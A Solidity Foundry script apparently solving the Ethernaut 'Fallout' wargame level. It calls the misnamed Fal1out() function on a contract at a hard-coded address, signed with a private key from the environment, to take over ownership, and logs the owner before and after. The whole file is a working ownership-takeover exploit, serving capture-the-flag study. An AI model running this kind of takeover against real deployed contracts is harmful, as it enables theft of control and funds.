// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import '../lib/forge-std/src/Script.sol';
import '../src/Fallout.sol';
contract FalloutScript is Script {
  Fallout target = Fallout(0x49B8b74C81DD81533dA56075cc78E6060540f5AB);

  function run() external {
    vm.startBroadcast(vm.envUint('PRIVATE_KEY'));
    console.log('owner: ', target.owner());
    target.Fal1out();
    console.log("owner: ", target.owner());
    vm.stopBroadcast();
  }
}
